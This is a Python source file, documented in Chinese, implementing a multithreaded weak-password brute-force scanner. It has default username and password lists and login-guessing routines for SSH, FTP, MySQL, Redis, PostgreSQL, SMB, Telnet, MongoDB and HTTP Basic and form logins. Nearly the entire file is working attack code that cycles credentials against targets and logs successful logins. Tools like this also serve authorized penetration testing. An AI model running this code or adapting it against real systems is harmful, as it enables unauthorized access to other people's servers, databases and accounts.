# -*- coding:utf-8 -*-

"""
弱口令爆破模块
功能:
1. SSH弱口令爆破
2. FTP弱口令爆破
3. MySQL弱口令爆破
4. Redis弱口令爆破
5. PostgreSQL弱口令爆破
6. SMB弱口令爆破
7. Telnet弱口令爆破
8. Web后台弱口令爆破
9. 多线程爆破支持
10. 自定义字典支持
"""

import logging
import threading
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("BruteForce")


@dataclass
class BruteForceResult:
    host: str
    port: int
    service: str
    success: bool = False
    username: str = ""
    password: str = ""
    error: str = ""
    raw_data: Dict[str, Any] = field(default_factory=dict)


DEFAULT_USERS = [
    "admin", "root", "administrator", "user", "test", "guest",
    "mysql", "postgres", "oracle", "sa", "ftp", "www", "www-data",
    "nginx", "apache", "tomcat", "manager", "webmaster", "backup",
    "operator", "support", "sales", "dev", "developer", "sysadmin"
]

DEFAULT_PASSWORDS = [
    "", "123456", "password", "admin", "root", "12345678",
    "123456789", "1234567890", "111111", "000000", "admin123",
    "root123", "test", "test123", "guest", "guest123", "qwerty",
    "qwerty123", "abc123", "password123", "1234567", "12345678910",
    "admin@123", "root@123", "Admin123", "Root123", "P@ssw0rd",
    "p@ssword", "Passw0rd", "passw0rd", "welcome", "welcome123",
    "letmein", "master", "master123", "login", "login123",
    "changeme", "changeme123", "default", "default123",
    "server", "server123", "database", "database123",
    "mysql", "mysql123", "postgres", "postgres123",
    "redis", "redis123", "ftp123", "www123", "web123"
]


class ServiceBruteForcer:
    
    def __init__(self, timeout: int = 10, max_threads: int = 5):
        self.timeout = timeout
        self.max_threads = max_threads
        self._lock = threading.Lock()
        self._results: List[BruteForceResult] = []
        self._stop_flag = False
    
    def _add_result(self, result: BruteForceResult):
        with self._lock:
            self._results.append(result)
    
    def stop(self):
        self._stop_flag = True
    
    def brute_ssh(self, host: str, port: int, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        try:
            import paramiko
        except ImportError:
            logger.error("paramiko库未安装，请运行: pip install paramiko")
            return results
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=host, port=port, service="ssh", username=user, password=password)
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, port=port, username=user, password=password, timeout=self.timeout, banner_timeout=self.timeout)
                    result.success = True
                    client.close()
                    logger.info(f"[SSH] {host}:{port} - {user}:{password} 成功!")
                    results.append(result)
                    self._add_result(result)
                    return results
                except paramiko.AuthenticationException:
                    pass
                except Exception as e:
                    result.error = str(e)
                finally:
                    try:
                        client.close()
                    except:
                        pass
        
        return results
    
    def brute_ftp(self, host: str, port: int, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        import ftplib
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=host, port=port, service="ftp", username=user, password=password)
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(host, port, timeout=self.timeout)
                    ftp.login(user, password)
                    result.success = True
                    ftp.quit()
                    logger.info(f"[FTP] {host}:{port} - {user}:{password} 成功!")
                    results.append(result)
                    self._add_result(result)
                    return results
                except ftplib.error_perm:
                    pass
                except Exception as e:
                    result.error = str(e)
                finally:
                    try:
                        ftp.quit()
                    except:
                        pass
        
        return results
    
    def brute_mysql(self, host: str, port: int, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        try:
            import pymysql
        except ImportError:
            logger.error("pymysql库未安装，请运行: pip install pymysql")
            return results
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=host, port=port, service="mysql", username=user, password=password)
                try:
                    conn = pymysql.connect(host=host, port=port, user=user, password=password, connect_timeout=self.timeout)
                    result.success = True
                    conn.close()
                    logger.info(f"[MySQL] {host}:{port} - {user}:{password} 成功!")
                    results.append(result)
                    self._add_result(result)
                    return results
                except pymysql.err.OperationalError:
                    pass
                except Exception as e:
                    result.error = str(e)
        
        return results
    
    def brute_redis(self, host: str, port: int, passwords: List[str]) -> List[BruteForceResult]:
        results = []
        try:
            import redis
        except ImportError:
            logger.error("redis库未安装，请运行: pip install redis")
            return results
        
        for password in passwords:
            if self._stop_flag:
                break
            result = BruteForceResult(host=host, port=port, service="redis", username="", password=password)
            try:
                r = redis.Redis(host=host, port=port, password=password if password else None, socket_connect_timeout=self.timeout)
                r.ping()
                result.success = True
                logger.info(f"[Redis] {host}:{port} - 密码: {password if password else '(空)'} 成功!")
                results.append(result)
                self._add_result(result)
                return results
            except redis.exceptions.AuthenticationError:
                pass
            except redis.exceptions.NoPermissionError:
                pass
            except Exception as e:
                result.error = str(e)
        
        return results
    
    def brute_postgres(self, host: str, port: int, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        try:
            import psycopg2
        except ImportError:
            logger.error("psycopg2库未安装，请运行: pip install psycopg2-binary")
            return results
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=host, port=port, service="postgres", username=user, password=password)
                try:
                    conn = psycopg2.connect(host=host, port=port, user=user, password=password, connect_timeout=self.timeout)
                    result.success = True
                    conn.close()
                    logger.info(f"[PostgreSQL] {host}:{port} - {user}:{password} 成功!")
                    results.append(result)
                    self._add_result(result)
                    return results
                except psycopg2.OperationalError:
                    pass
                except Exception as e:
                    result.error = str(e)
        
        return results
    
    def brute_smb(self, host: str, port: int, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        try:
            from smb.SMBConnection import SMBConnection
        except ImportError:
            logger.error("pysmb库未安装，请运行: pip install pysmb")
            return results
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=host, port=port, service="smb", username=user, password=password)
                try:
                    conn = SMBConnection(user, password, "client", host, use_ntlm_v2=True)
                    conn.connect(host, port, timeout=self.timeout)
                    result.success = True
                    conn.close()
                    logger.info(f"[SMB] {host}:{port} - {user}:{password} 成功!")
                    results.append(result)
                    self._add_result(result)
                    return results
                except Exception as e:
                    result.error = str(e)
        
        return results
    
    def brute_telnet(self, host: str, port: int, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        import telnetlib
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=host, port=port, service="telnet", username=user, password=password)
                try:
                    tn = telnetlib.Telnet(host, port, timeout=self.timeout)
                    tn.read_until(b"login: ", timeout=self.timeout)
                    tn.write(user.encode() + b"\n")
                    tn.read_until(b"Password: ", timeout=self.timeout)
                    tn.write(password.encode() + b"\n")
                    response = tn.read_some().decode('utf-8', errors='ignore')
                    if "Login incorrect" not in response and "failed" not in response.lower():
                        result.success = True
                        logger.info(f"[Telnet] {host}:{port} - {user}:{password} 成功!")
                        results.append(result)
                        self._add_result(result)
                        tn.close()
                        return results
                    tn.close()
                except Exception as e:
                    result.error = str(e)
        
        return results
    
    def brute_mongodb(self, host: str, port: int, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        try:
            from pymongo import MongoClient
            from pymongo.errors import OperationFailure
        except ImportError:
            logger.error("pymongo库未安装，请运行: pip install pymongo")
            return results
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=host, port=port, service="mongodb", username=user, password=password)
                try:
                    if user or password:
                        uri = f"mongodb://{user}:{password}@{host}:{port}/"
                    else:
                        uri = f"mongodb://{host}:{port}/"
                    client = MongoClient(uri, serverSelectionTimeoutMS=self.timeout * 1000)
                    client.server_info()
                    result.success = True
                    client.close()
                    logger.info(f"[MongoDB] {host}:{port} - {user}:{password} 成功!")
                    results.append(result)
                    self._add_result(result)
                    return results
                except OperationFailure:
                    pass
                except Exception as e:
                    result.error = str(e)
        
        return results
    
    def brute_http_basic(self, url: str, users: List[str], passwords: List[str]) -> List[BruteForceResult]:
        results = []
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=url, port=0, service="http_basic", username=user, password=password)
                try:
                    response = requests.get(url, auth=(user, password), timeout=self.timeout)
                    if response.status_code != 401:
                        result.success = True
                        logger.info(f"[HTTP Basic] {url} - {user}:{password} 成功!")
                        results.append(result)
                        self._add_result(result)
                        return results
                except Exception as e:
                    result.error = str(e)
        
        return results
    
    def brute_http_form(self, url: str, users: List[str], passwords: List[str], 
                        username_field: str = "username", password_field: str = "password",
                        success_indicator: str = "", fail_indicator: str = "") -> List[BruteForceResult]:
        results = []
        
        session = requests.Session()
        adapter = HTTPAdapter(max_retries=Retry(total=2, backoff_factor=0.5))
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        for user in users:
            if self._stop_flag:
                break
            for password in passwords:
                if self._stop_flag:
                    break
                result = BruteForceResult(host=url, port=0, service="http_form", username=user, password=password)
                try:
                    data = {username_field: user, password_field: password}
                    response = session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
                    
                    if success_indicator and success_indicator in response.text:
                        result.success = True
                    elif fail_indicator and fail_indicator not in response.text:
                        result.success = True
                    elif response.status_code == 302 or "logout" in response.text.lower():
                        result.success = True
                    
                    if result.success:
                        logger.info(f"[HTTP Form] {url} - {user}:{password} 成功!")
                        results.append(result)
                        self._add_result(result)
                        return results
                except Exception as e:
                    result.error = str(e)
        
        return results


class BruteForceScanner:
    
    SERVICE_PORTS = {
        "ssh": 22,
        "ftp": 21,
        "mysql": 3306,
        "redis": 6379,
        "postgres": 5432,
        "smb": 445,
        "telnet": 23,
        "mongodb": 27017,
    }
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.max_threads = self.config.get("max_threads", 5)
        self.users = self.config.get("users", DEFAULT_USERS)
        self.passwords = self.config.get("passwords", DEFAULT_PASSWORDS)
        self.user_dict = self.config.get("user_dict", "")
        self.pass_dict = self.config.get("pass_dict", "")
        
        if self.user_dict and Path(self.user_dict).exists():
            self.users = self._load_dict(self.user_dict)
        if self.pass_dict and Path(self.pass_dict).exists():
            self.passwords = self._load_dict(self.pass_dict)
        
        self._brute_forcer = ServiceBruteForcer(timeout=self.timeout, max_threads=self.max_threads)
        self._results: List[BruteForceResult] = []
    
    def _load_dict(self, filepath: str) -> List[str]:
        items = []
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        items.append(line)
        except Exception as e:
            logger.error(f"加载字典失败: {e}")
        return items
    
    def scan(self, target: str, service: str, port: Optional[int] = None, 
             users: Optional[List[str]] = None, passwords: Optional[List[str]] = None) -> List[BruteForceResult]:
        users = users or self.users
        passwords = passwords or self.passwords
        port = port or self.SERVICE_PORTS.get(service, 0)
        
        logger.info(f"开始爆破: {target}:{port} ({service})")
        
        results = []
        
        if service == "ssh":
            results = self._brute_forcer.brute_ssh(target, port, users, passwords)
        elif service == "ftp":
            results = self._brute_forcer.brute_ftp(target, port, users, passwords)
        elif service == "mysql":
            results = self._brute_forcer.brute_mysql(target, port, users, passwords)
        elif service == "redis":
            results = self._brute_forcer.brute_redis(target, port, passwords)
        elif service == "postgres":
            results = self._brute_forcer.brute_postgres(target, port, users, passwords)
        elif service == "smb":
            results = self._brute_forcer.brute_smb(target, port, users, passwords)
        elif service == "telnet":
            results = self._brute_forcer.brute_telnet(target, port, users, passwords)
        elif service == "mongodb":
            results = self._brute_forcer.brute_mongodb(target, port, users, passwords)
        elif service == "http_basic":
            results = self._brute_forcer.brute_http_basic(target, users, passwords)
        elif service == "http_form":
            results = self._brute_forcer.brute_http_form(target, users, passwords)
        else:
            logger.error(f"不支持的服务类型: {service}")
        
        self._results.extend(results)
        return results
    
    def scan_multiple(self, targets: List[Dict[str, Any]]) -> List[BruteForceResult]:
        all_results = []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for target in targets:
                host = target.get("host", "")
                service = target.get("service", "")
                port = target.get("port")
                users = target.get("users")
                passwords = target.get("passwords")
                
                if host and service:
                    future = executor.submit(self.scan, host, service, port, users, passwords)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    results = future.result()
                    all_results.extend(results)
                except Exception as e:
                    logger.error(f"爆破任务异常: {e}")
        
        return all_results
    
    def get_results(self) -> List[BruteForceResult]:
        return self._results
    
    def get_success_results(self) -> List[BruteForceResult]:
        return [r for r in self._results if r.success]
    
    def stop(self):
        self._brute_forcer.stop()
    
    def to_dict(self, result: BruteForceResult) -> Dict[str, Any]:
        return {
            "host": result.host,
            "port": result.port,
            "service": result.service,
            "success": result.success,
            "username": result.username,
            "password": result.password,
            "error": result.error,
            "raw_data": result.raw_data
        }
    
    def to_dict_list(self, results: List[BruteForceResult]) -> List[Dict[str, Any]]:
        return [self.to_dict(r) for r in results]
